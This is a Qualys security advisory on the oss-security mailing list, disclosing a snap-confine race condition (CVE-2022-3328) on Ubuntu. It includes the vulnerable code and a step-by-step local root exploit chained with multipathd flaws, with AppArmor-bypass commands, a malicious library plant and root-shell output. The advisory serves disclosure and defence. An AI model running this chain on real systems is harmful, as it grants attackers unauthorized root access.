Received: (qmail 30524 invoked by uid 550); 30 Nov 2022 23:28:44 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 30491 invoked from network); 30 Nov 2022 23:28:42 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=from : to : subject :
 date : message-id : content-type : content-id : content-transfer-encoding
 : mime-version; s=qualyscom;
 bh=AusEKvVozFxHgiAqgmu9AssKMwRHhYzL4C9/j23AFac=;
 b=tJYBuVY4EL03GrD85oI+qrWxCcFPsbZ/A7r+7pXiwO81td44L79NWgjOcVTYoHiDq5cw
 6SKJ9iNZ2I3LrJZu4HZtuqLpLHfwDSg8GuEpnZDqk6kKWAXjCJ0hegJVJhvSC8B8RrF+
 WerIS11Tg3xDzNusbPxuEeGOi/VDUN/ZpH3eBsl5yK3h3OUT14ZuQcFYwIALOJbQzQ6V
 EnSGXEJpUXEuLkroAlu++a8sN7kRXfWP4Wz4y3g87m6X8ElZcP4lWtM4MH5MQcPxisXA
 5dgMJhNmGHhdC31GJ1n67hxOB7X+D44GwJ6ZWRQxwDhDpfOjlIFPnxjGQxczWkga3/BV Qg== 
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=Sveb6CvSQmMlk2YFYse4ZKhCCwW4CilbYojIppIWfTT72u2S4VsRTsDBnOUqelt5rPqXn2Usv4aSYzCopPPpmTXyxvjMcMguDbgyJ59JfQLVurqcU2phZYE6+Guh+wAXAuGipuDlzL51ckFtvbw2yznCma1FsSP1t3LTeyG7XLa2tzgERfEQBqJMJi/yrwyX3D5s4cIJvcMKd0gbG06Bn2SP2MPopTBeH+TR7+Uf1sey+qXNZ7SD+SS35L2qkBxnrRr/Q5j5XynSuYsxoBAP2m52Ivsfxt/27XqA0P3Yx+C/t6mUouTxwEPFvukYHMteCoKQvw0718E0QEOORGGIXA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=AusEKvVozFxHgiAqgmu9AssKMwRHhYzL4C9/j23AFac=;
 b=PB048J7c+XGRZKx/Sn+j272WYdELsquVQXG7CSS16YWWLpt/mFNMk6JqD7LmI+sdyqNNVJEEop9V0MfLypIjgIiafy6h5a1t+8eJbT7RI0N4HNz9RqIuzD2lr/F4IodTNjY7RhOjC4Daz0AaXfqnBhQfOcVw3a7JsRJCQTFPfevQVkG/xpqGwNaDbXZHISvdlgTLLUI7UJQdr5pchG9Gos7xLFL0zY0CFAyqTc6fzGPuztSBiFxZcqJi9jE/NOE7VHPcl4vC1tkEkmbby03PSbnKU8T9HviOjpIGDPhhEjgjMzQAsKkVgRka4h903k7Tpd0ZXdjiB9YSm6oVCRe+Dg==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=AusEKvVozFxHgiAqgmu9AssKMwRHhYzL4C9/j23AFac=;
 b=WdXAOOn34rlKbCnITs+5yl4qhjxvhtfxhnm/kCs0VjwwPlXRO63j+ph77SjAzypFg2mQoYkGPM0OJIaPBuTT/VV4eJ0g7BZDmcjaDyRsUQRzxwWP6UBzMyEqzlHt38whMTu70yYSAEMOl3j7EoAoyGDJbbjlr+jPTGbkdXWM09zdTZ3SEvCaXdWbfRDs8iSgJQhwUpUXJzRxhJp7Nj0RSYvTALJKMim8Vywlsy0iRGq8nWtNTvi/M+8I90wPLGzHt1VETb24eJfYCrUUsWdN8RjvDk8Tc3u+vUC4MJvx3BKqRQMwWKSwJAm0bKpoj5Cjhl99DSQJNmM9pB4eJ5qRhQ==
From: Qualys Security Advisory <qsa@qualys.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: Race condition in snap-confine's
 must_mkdir_and_open_with_perms() (CVE-2022-3328)
Thread-Index: AQHZBRNykEN43eVBck+2ajiDoj/Wtw==
Date: Wed, 30 Nov 2022 23:28:27 +0000
Message-ID: <20221130232713.GA19464@localhost.localdomain>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: SJ0PR06MB6910:EE_|MWHPR06MB2958:EE_
x-ms-office365-filtering-correlation-id: 1f952963-216b-4e7e-52bb-08dad32a9561
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;
x-microsoft-antispam-message-info: 
 TBDvQixUDfYdYtgvb4TbxDg3W0wgegx0I7G2HKZvGgsg18G3Ogl7++YxZkZUN/tk7/8tKAmD8l3VekjCBkQWQnsYQSR5sDQ/FI5L0pe+CJ9NtfgQtwVWangLrDM6ElXaxULRORqp/wpYdCAvLNcXpE/nJ0IYQSa85sSLXaY6w+KGtKF0IL8TdQzWW5JMW0qB70K7JVkWccDq9OYKR4UGgNkRWBCMeMyM8C3CtqLM66jl10dZfMQP0NQYvYdwzj0ol4yHoTF1D2kS1Obm+BwR5EM6r3I3N+RRH1qj7s0ZZpdieucBIMagnSlYwgdOr1RIMk6j/1Au2lCVz0211nA0sxL76u4sYppKBDAiW0o5iDvBo3UcoL7aDexyaJtt5g7Kka5yAwBYHepOmwVjGeZRGXdqWDkOTbascifokExJlrcJPLL9BMBCJ5AuUUrveT82zuWzu7bCrLhPhhul700oYdOXnWLK/KY50bXAduuoINnaKo9WkIYIW0HcBf2dbU/NyoZZqyHkE0Eku9b4i9b498PFDzaXBct4Hc0CBSusJ0xnlacKl13jDradH5xxWjs439wJbfv2YnFK0HdqV3B012xHYTsSFVjqIryk52Fl7+Kgzj39xBNQF2eH5GTrv7myvkVIbKPc/H5eSwNIMRw1POPAnvhwg0xM+DtsZ79IeFXPC6WT+meY4mi+ap6ZCU7fWW3hg/yotfqjrcnJHbO2ZvNKjySJgCzpns4FCyBKzhuMWnRPUy/9m+QC0+VzYVVNFKA/5ur46FVz10gDgJKkYw==
x-forefront-antispam-report: 
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR06MB6910.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230022)(39860400002)(346002)(366004)(136003)(376002)(396003)(451199015)(2906002)(83380400001)(966005)(38100700002)(55236004)(41300700001)(66946007)(91956017)(76116006)(9686003)(6512007)(66556008)(8676002)(66446008)(26005)(33656002)(64756008)(66476007)(6506007)(478600001)(71200400001)(122000001)(6486002)(186003)(1076003)(5660300002)(8936002)(316002)(86362001)(38070700005)(6916009)(30864003)(4001150100001);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0: 
 =?us-ascii?Q?cGyJkg/HvK8W/ZK8ePO33gd1Mgh5lzaYOMbHcWJpf5ckrLxMzWeJInCGZcSp?=
 =?us-ascii?Q?QzfTgIxsmzcRn6MclENuoePMjyga46gG74FxeV2jKAUnUswN1UqZ54Sxe2Jk?=
 =?us-ascii?Q?m2Y9dKlMokG7FNLt3A4dMupG4Rctz9EbVx476SeQ0gaFf3+HmwZhgbc/yshN?=
 =?us-ascii?Q?urGsGYPzi8YMNqDykOGhyGYSwb68UyE+Oef2MHHvLLNfutF+uM9fMboM3Qc6?=
 =?us-ascii?Q?gqo4WAglJH3iU9mThroAEfExz0QAGXQLdHnFqzP/wMmnNgY5gr69QSYFLzph?=
 =?us-ascii?Q?NoxdiimZsx3GpTtici/VknaHarNt/j4Z2ygsxmaKLCZNdSa2+7wvUbe5KHhP?=
 =?us-ascii?Q?b/1unkFy3r1CC/3cSKRAbjQ72ZRbpt+AyTTP2Zeh9Z3gtAfok1aLl41cb4Qj?=
 =?us-ascii?Q?ANQSaom0sKOB+LOMTS54NCYlpwQPwSkNxl0Fyt3Pdw5DhFCpSR8l3qqKdusf?=
 =?us-ascii?Q?2MwL6hIQXa7cxDH0wGzPmzMqiX4ZMjon94vIRENzIz1c/Fp0akgfJdDzNh1J?=
 =?us-ascii?Q?vk4RzKYA1t9VTuNPtpTjsvxaMKrsoSp5Aw8BykLZUxUfweJlpg6J/emeF5SE?=
 =?us-ascii?Q?DA8UudvmxWoaS9DCLE39V+1mgrlQJBl7plzCDrfapq6DVfthvHJPBxaactrL?=
 =?us-ascii?Q?ywcFyZ3WUwhf04UjsWKHpnPboEqRlJTRm1yOmRCmZ0YP+exN+0YlQ2er6sTz?=
 =?us-ascii?Q?Y8gm7e1bIzttca+CWmERfxQHkXk0Y+Z29tKdKGto1VaC8nMLTbuGyUTxensy?=
 =?us-ascii?Q?AZWfcWTQ3oK3x15IqeViA7sEHiPCt546UtB8oTjKhp/28anYmBqygHueEiwf?=
 =?us-ascii?Q?NHEX5/FkxBjsqtJYvn2kIMnb6xnNk0dRD9ODN7V+0duIrfFzu1icOZBYT3OC?=
 =?us-ascii?Q?0HX3K9UK7mx5aT/cVefoZqSz+pUy9B0daPwp4TOG2R+6wLbRkRweM6VPrLnx?=
 =?us-ascii?Q?JnVOShH9dZdf2FhYjPRllj+wiJkOL0E+JZm2hYz6jgXOdfw4qHrUFvFR/lxB?=
 =?us-ascii?Q?6Lmz3arqudovQdZArdWrJS/OqBTIjnKK15uFFNX6cxoExBIfF5FLzm9mfRUm?=
 =?us-ascii?Q?gOaQFPkDGR+BR2CjSi7GcwYW1uYhlBV0JYuEJnU4I5fmD1oJAy4cRUyLGv7w?=
 =?us-ascii?Q?5MS4e0zZdPlFSF5wUObCiZVLrBc6rgd9/k0WoGbRHBEmxDrWir+XQvKEBWX6?=
 =?us-ascii?Q?PVZNJ4NjMqDOfejSRHe+wEy3DanNJaK7Wf1Vp9qcACHnWJC5X+D7Lg3FqO4d?=
 =?us-ascii?Q?97F83pNsz3RuZASQGP04ByMr3S3x4UxJWNQsq7GxkHN+xFdkXa0V7Et6xasA?=
 =?us-ascii?Q?58N7HOp13fX4ICUX08V3GYYt+20oUku3wbYjWTC0V4UYBUf+gCIQS5G3Esu6?=
 =?us-ascii?Q?lAmrFAv96duwxXU/T0OMvJlsI3WwhTdVKewSAyqe9Gy8XQDPQuA6QApph6Ir?=
 =?us-ascii?Q?Sb6JJi61oNjm9qyR5NZ+nDcXcuqszimoHfmvxHt0FP4NzYfBKC7M1P0Jf/EZ?=
 =?us-ascii?Q?Kbx38br1tlbe8KoVC6uFCvYe7Qv2mzP1OPRkHYyJgYPmr4GLQvA9H1r95MZQ?=
 =?us-ascii?Q?VPgC9fzEtrjc+r1OHy/2ObY24ig6UfwMVPge2zq9Aq5A60hrabXi8V2WCvWd?=
 =?us-ascii?Q?isgfi2tAUgeNJYHBzxwRfEA=3D?=
Content-Type: text/plain; charset="us-ascii"
Content-ID: <076921B1DFB8264E907D01DCD848D249@namprd06.prod.outlook.com>
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: SJ0PR06MB6910.namprd06.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 1f952963-216b-4e7e-52bb-08dad32a9561
X-MS-Exchange-CrossTenant-originalarrivaltime: 30 Nov 2022 23:28:27.4460
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: WK1RKP79oFC6q/QkzLKP53EBPjJZoY9yGtpf4JrCCi+h/dEWNev8TYJMiygMLYNIf4P2xHw4c7u/W6QEKAHbcrP473CywyhAUQ/8QyekbV4=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: MWHPR06MB2958
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.219,Aquarius:18.0.895,Hydra:6.0.545,FMLib:17.11.122.1
 definitions=2022-11-30_04,2022-11-30_02,2022-06-22_01
Subject: [oss-security] Race condition in snap-confine's must_mkdir_and_open_with_perms()
 (CVE-2022-3328)


Qualys Security Advisory

Race condition in snap-confine's must_mkdir_and_open_with_perms()
(CVE-2022-3328)


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Contents
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Summary
Background
Exploitation
Acknowledgments
Timeline

    I can't help but feel a missed opportunity to integrate lyrics from
    one of the best songs ever: [SNAP! - The Power (Official Video)]
        -- https://twitter.com/spendergrsec/status/1494420041076461570


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Summary
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We discovered a race condition (CVE-2022-3328) in snap-confine, a
SUID-root program installed by default on Ubuntu. In this advisory, we
tell the story of this vulnerability (which was introduced in February
2022 by the patch for CVE-2021-44731) and detail how we exploited it in
Ubuntu Server (a local privilege escalation, from any user to root) by
combining it with two vulnerabilities in multipathd (an authorization
bypass and a symlink attack, CVE-2022-41974 and CVE-2022-41973):

https://www.qualys.com/2022/10/24/leeloo-multipath/leeloo-multipath.txt


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Background
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    Like the crack of the whip, I Snap! attack
    Radical mind, day and night all the time
        -- SNAP! - The Power

In February 2022, we published CVE-2021-44731 in our "Lemmings" advisory
(https://www.qualys.com/2022/02/17/cve-2021-44731/oh-snap-more-lemmings.txt=
):
to set up a snap's sandbox, snap-confine created the temporary directory
/tmp/snap.$SNAP_NAME or reused it if it already existed, even if it did
not belong to root; a local attacker could race against snap-confine,
retain control over /tmp/snap.$SNAP_NAME, and eventually obtain full
root privileges.

This vulnerability was patched by commit acb2b4c ("cmd/snap-confine:
Prevent user-controlled race in setup_private_mount"), which introduced
a new helper function, must_mkdir_and_open_with_perms():

------------------------------------------------------------------------
142 static void setup_private_mount(const char *snap_name)
...
169         sc_must_snprintf(base_dir, sizeof(base_dir), "/tmp/snap.%s", sn=
ap_name);
...
176         base_dir_fd =3D must_mkdir_and_open_with_perms(base_dir, 0, 0, =
0700);
------------------------------------------------------------------------
 55 static int must_mkdir_and_open_with_perms(const char *dir, uid_t uid, g=
id_t gid,
 56                                           mode_t mode)
 ..
 61  mkdir:
 ..
 67         if (mkdir(dir, 0700) < 0 && errno !=3D EEXIST) {
 ..
 70         fd =3D open(dir, O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLO=
W);
 ..
 81         if (fstat(fd, &st) < 0) {
 ..
 84         if (st.st_uid !=3D uid || st.st_gid !=3D gid
 85             || st.st_mode !=3D (S_IFDIR | mode)) {
...
130                 if (rename(dir, random_dir) < 0) {
...
135                 goto mkdir;
------------------------------------------------------------------------

- the temporary directory /tmp/snap.$SNAP_NAME is created at line 67, if
  it does not exist already;

- if it already exists, and if it does not belong to root (at line 84),
  then it is moved out of the way (at line 130) by rename()ing it to a
  random directory in /tmp, and its creation is retried (at line 135).

When we reviewed this patch back in December 2021, we felt very nervous
about this rename() call (because it allows a local attacker to rename()
a directory they do not own), and we advised the Ubuntu Security Team to
either not reuse the directory /tmp/snap.$SNAP_NAME at all, or to create
it in a non-world-writable directory instead of /tmp, or at least to use
renameat2(RENAME_EXCHANGE) instead of rename(). Unfortunately, all of
these ideas were deemed impractical (for example, renameat2() is not
supported by older kernel and glibc versions); moreover, we (Qualys)
failed to come up with a feasible attack plan against this rename()
call, so the patch was kept in its current form.

After the release of Ubuntu 22.04 in April 2022, we decided to revisit
snap-confine and its recent hardening changes, and we finally found a
way to exploit the rename() call in must_mkdir_and_open_with_perms().


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Exploitation
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    It's getting, it's getting, it's getting kinda heavy
    It's getting, it's getting, it's getting kinda hectic
        -- SNAP! - The Power

The three key ideas to exploit the rename() of /tmp/snap.$SNAP_NAME are:

1/ snap-confine operates in /tmp to create a snap's temporary directory
(/tmp/snap.$SNAP_NAME in setup_private_mount()), but it also operates in
/tmp to create the snap's *root* directory (/tmp/snap.rootfs_XXXXXX in
sc_bootstrap_mount_namespace(), where all of the Xs are randomized by
mkdtemp()), and the string rootfs_XXXXXX is accepted as a valid snap
instance name by sc_instance_name_validate() (when all of the Xs are
lowercase alphanumeric):

------------------------------------------------------------------------
286 static void sc_bootstrap_mount_namespace(const struct sc_mount_config *=
config)
...
288         char scratch_dir[] =3D "/tmp/snap.rootfs_XXXXXX";
...
291         if (mkdtemp(scratch_dir) =3D=3D NULL) {
...
303         sc_do_mount(scratch_dir, scratch_dir, NULL, MS_BIND, NULL);
...
319         sc_do_mount(config->rootfs_dir, scratch_dir, NULL, MS_REC | MS_=
BIND,
...
331         for (const struct sc_mount * mnt =3D config->mounts; mnt->path =
!=3D NULL;
...
342                 sc_must_snprintf(dst, sizeof dst, "%s/%s", scratch_dir,
343                                  mnt->path);
...
352                         sc_do_mount(mnt->path, dst, NULL, MS_REC | MS_B=
IND,
------------------------------------------------------------------------

2/ We therefore execute two instances of snap-confine in parallel:

- we block the first snap-confine immediately after it creates its root
  directory /tmp/snap.rootfs_XXXXXX at line 291 (we reliably win this
  race condition by "single-stepping" snap-confine, as explained in our
  "Lemmings" advisory);

- we execute the second snap-confine with a snap instance name of
  rootfs_XXXXXX -- i.e., the temporary directory /tmp/snap.$SNAP_NAME of
  this second snap-confine is the root directory /tmp/snap.rootfs_XXXXXX
  of the first snap-confine;

- we kill this second snap-confine immediately after it rename()s its
  temporary directory /tmp/snap.$SNAP_NAME -- i.e., the root directory
  /tmp/snap.rootfs_XXXXXX of the first snap-confine -- at line 130 (we
  reliably win this race condition with inotify, as explained in our
  "Lemmings" advisory);

- we re-create the directory /tmp/snap.rootfs_XXXXXX ourselves, and
  resume the execution of the first snap-confine, whose root directory
  now belongs to us.

3/ We can therefore create an arbitrary symlink
/tmp/snap.rootfs_XXXXXX/tmp, and sc_bootstrap_mount_namespace() will
bind-mount the real /tmp directory (which is world-writable) onto any
directory in the filesystem (because mount() will follow our arbitrary
symlink at line 352).

This ability will eventually allow us to obtain full root privileges,
but we must first solve three problems:

------------------------------------------------------------------------
Problem a/ We cannot trick snap-confine into rename()ing
/tmp/snap.rootfs_XXXXXX, because this directory belongs to root and
must_mkdir_and_open_with_perms() rename()s it only if it does not belong
to root!

This problem solves itself naturally: indeed, /tmp/snap.rootfs_XXXXXX
belongs to the user root, but it belongs to the group of our own user,
so must_mkdir_and_open_with_perms() rename()s it because it does not
belong to the group root (at line 84).

------------------------------------------------------------------------
Problem b/ We cannot trick snap-confine into following our symlink
/tmp/snap.rootfs_XXXXXX/tmp, because sc_bootstrap_mount_namespace()
bind-mounts a read-only squashfs onto /tmp/snap.rootfs_XXXXXX (at line
319): if we create our symlink before this bind-mount, then it becomes
covered by the squashfs; and we cannot create our symlink after this
bind-mount, because the squashfs is read-only and belongs to root!

The "Prologue: CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount"
of our "Lemmings" advisory suggests a solution to this problem: we must
unmount /tmp/snap.rootfs_XXXXXX each time sc_bootstrap_mount_namespace()
bind-mounts it (at lines 303 and 319). The "(deleted)" technique we used
in "Lemmings" (CVE-2021-3996 in util-linux) was patched in January 2022,
but we found a surprisingly simple workaround:

we mount a FUSE filesystem onto /tmp/snap.rootfs_XXXXXX, immediately
after we re-create this directory ourselves; this allows us to unmount
(with fusermount -u -z) any subsequent bind-mounts (even if they belong
to root), because fusermount does not check that our FUSE filesystem is
indeed the most recently mounted filesystem on /tmp/snap.rootfs_XXXXXX.

------------------------------------------------------------------------
Problem c/ We cannot trick snap-confine into bind-mounting the real /tmp
onto an arbitrary directory in the filesystem (at line 352), because
such a bind-mount is forbidden by snap-confine's AppArmor profile!

To solve this problem, we must bypass AppArmor completely, but the
technique we used in our "Lemmings" advisory (we wrapped snap-confine's
execution in an AppArmor profile that was in "complain" mode, not in
"enforce" mode) was patched in February 2022 (by commits 26eed65 and
4a2eb78, "ensure that snap-confine is in strict confinement" and
"Tighten AppArmor label check"):

now, snap-confine's execution must be wrapped in an AppArmor profile
that is in "enforce" mode and whose label matches the regular expression
"^(/snap/(snapd|core)/x?[0-9]+/usr/lib|/usr/lib(exec)?)/snapd/snap-confine$=
".

We were about to give up on trying to exploit snap-confine, when we
discovered CVE-2022-41974 and CVE-2022-41973 in multipathd (which is
installed by default on Ubuntu Server): these two vulnerabilities allow
us to create a directory named "failed_wwids" (user root, group root,
mode 0700) anywhere in the filesystem, and we were able to transform
this very limited directory creation into a complete AppArmor bypass.

AppArmor supports policy namespaces that are loosely related to kernel
user namespaces; by default, no AppArmor namespaces exist:

------------------------------------------------------------------------
$ ls -la /sys/kernel/security/apparmor/policy/namespaces
total 0
drwxr-xr-x 2 root root 0 Aug  6 12:42 .
drwxr-xr-x 5 root root 0 Aug  6 12:42 ..
------------------------------------------------------------------------

However, we (attackers) can create an AppArmor namespace "failed_wwids"
by exploiting CVE-2022-41974 and CVE-2022-41973 in multipathd:

------------------------------------------------------------------------
$ ln -s /sys/kernel/security/apparmor/policy/namespaces /dev/shm/multipath

$ multipathd list devices | grep 'whitelisted, unmonitored'
    sda1 devnode whitelisted, unmonitored
    ...

$ multipathd list list path sda1
fail

$ ls -la /sys/kernel/security/apparmor/policy/namespaces
total 0
drwxr-xr-x 3 root root 0 Aug  6 12:42 .
drwxr-xr-x 5 root root 0 Aug  6 12:42 ..
drwx------ 5 root root 0 Aug  6 13:38 failed_wwids
------------------------------------------------------------------------

Then, we can enter this AppArmor namespace by creating and entering an
unprivileged user namespace:

------------------------------------------------------------------------
$ aa-exec -n failed_wwids -p unconfined -- unshare -U -r /bin/sh
------------------------------------------------------------------------

Inside this namespace, we can create an AppArmor profile labeled
"/usr/lib/snapd/snap-confine" that is in "enforce" mode and allows all
possible operations:

------------------------------------------------------------------------
# apparmor_parser -K -a << "EOF"
/usr/lib/snapd/snap-confine (enforce) {
capability,
network,
mount,
remount,
umount,
pivot_root,
ptrace,
signal,
dbus,
unix,
file,
change_profile,
}
EOF
------------------------------------------------------------------------

Back in the initial namespace, we check that our "allow all" AppArmor
profile still exists:

------------------------------------------------------------------------
# aa-status
apparmor module is loaded.
32 profiles are loaded.
32 profiles are in enforce mode.
   ...
   :failed_wwids:/usr/lib/snapd/snap-confine
------------------------------------------------------------------------

Last, we make sure that snap-confine accepts our "allow all" AppArmor
profile (i.e., AppArmor is bypassed, and snap-confine is effectively
unconfined):

------------------------------------------------------------------------
$ env -i SNAPD_DEBUG=3D1 SNAP_INSTANCE_NAME=3Dlxd aa-exec -n failed_wwids -=
p /usr/lib/snapd/snap-confine -- /usr/lib/snapd/snap-confine --base lxd sna=
p.lxd.daemon /nonexistent
...
DEBUG: apparmor label on snap-confine is: /usr/lib/snapd/snap-confine
DEBUG: apparmor mode is: enforce
------------------------------------------------------------------------

We can therefore bind-mount /tmp onto an arbitrary directory in the
filesystem (by exploiting CVE-2022-3328); since we already depend on
multipathd to bypass AppArmor, we bind-mount /tmp onto /lib/multipath,
create our own shared library /lib/multipath/libchecktur.so, shutdown
multipathd (by exploiting CVE-2022-41974), restart multipathd (through
its Unix socket), and finally obtain full root privileges (because
multipathd executes our shared library as root when it restarts):

------------------------------------------------------------------------
$ grep multipath /proc/self/mountinfo | wc
      0       0       0

$ gcc -o CVE-2022-3328 CVE-2022-3328.c
$ ./CVE-2022-3328
scratch directory for constructing namespace: /tmp/snap.rootfs_0j4u9c

$ grep multipath /proc/self/mountinfo
1395 29 253:0 /tmp /usr/lib/multipath rw,relatime shared:1 - ext4 /dev/mapp=
er/ubuntu--vg-ubuntu--lv rw
...

$ gcc -fpic -shared -o /lib/multipath/libchecktur.so libtmpsh.c

$ ps -ef | grep 'multipath[d]'
root         371       1  0 12:42 ?        00:00:00 /sbin/multipathd -d -s

$ multipathd list list add del switch sus resu rei fai resi rese rel forc d=
is rest paths maps path P map P gro P rec dae statu stats top con bla dev r=
aw wil quit
ok

$ ps -ef | grep 'multipath[d]' | wc
      0       0       0

$ ls -l /tmp/sh
ls: cannot access '/tmp/sh': No such file or directory

$ multipathd list daemon
error -104 receiving packet

$ ls -l /tmp/sh
-rwsr-xr-x 1 root root 125688 Aug  6 14:55 /tmp/sh

$ /tmp/sh -p
# id
uid=3D65534(nobody) gid=3D65534(nogroup) euid=3D0(root) groups=3D65534(nogr=
oup)
                                     ^^^^^^^^^^^^
------------------------------------------------------------------------


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Acknowledgments
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We thank the Ubuntu security team (Alex Murray and Seth Arnold in
particular) and the snapd team for their hard work on this snap-confine
vulnerability. We also thank the members of linux-distros@openwall.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
